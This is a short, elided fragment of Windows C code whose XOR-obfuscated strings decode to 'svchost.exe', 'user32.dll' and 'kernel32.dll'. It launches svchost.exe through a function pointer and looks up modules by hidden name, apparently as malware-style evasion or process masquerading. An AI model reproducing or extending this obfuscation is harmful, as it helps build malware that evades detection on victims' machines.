...
void _(void *xp, void *zp) {
    ...
    (*(BOOL(*)(LPCSTR l, LPSTR lc, void *sap, void *tap, BOOL ih, DWORD cf, void *lpe, LPCSTR lpcd, void *sa, void *pi))zp)
        (XXX("\x2b\x2e\x3b\x30\x37\x2b\x2c\x76\x3d\x20\x3d"), NULL, NULL, NULL, FALSE, 0x8 | CREATE_NEW_PROCESS_GROUP, NULL, dir, &__s, &__p);
...
int main(int argc, const char *argv[]) {
    ...
    HMODULE u_h = GetModuleHandleA(XXX("\x2d\x2b\x3d\x2a\x6b\x6a\x76\x3c\x34\x34"));
    HMODULE k_h = GetModuleHandleA(XXX("\x33\x3d\x2a\x36\x3d\x34\x6b\x6a\x76\x3c\x34\x34"));
